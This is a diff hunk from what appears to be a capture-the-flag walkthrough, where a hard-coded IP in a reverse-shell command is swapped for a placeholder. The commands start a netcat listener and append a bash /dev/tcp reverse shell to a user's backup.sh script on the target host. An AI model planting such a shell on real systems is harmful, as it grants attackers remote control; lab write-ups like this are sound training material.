@@ -102,7 +102,7 @@ nc -nlvp 4444
 On target (as grimmie):
 ```bash
 echo '#!/bin/bash' > /home/grimmie/backup.sh
-echo 'bash -c "bash -i >& /dev/tcp/192.168.96.129/4444 0>&1"' >> /home/grimmie/backup.sh
+echo 'bash -c "bash -i >& /dev/tcp/(your IP ADDRESS)/4444 0>&1"' >> /home/grimmie/backup.sh
 chmod +x /home/grimmie/backup.sh
 ```
 
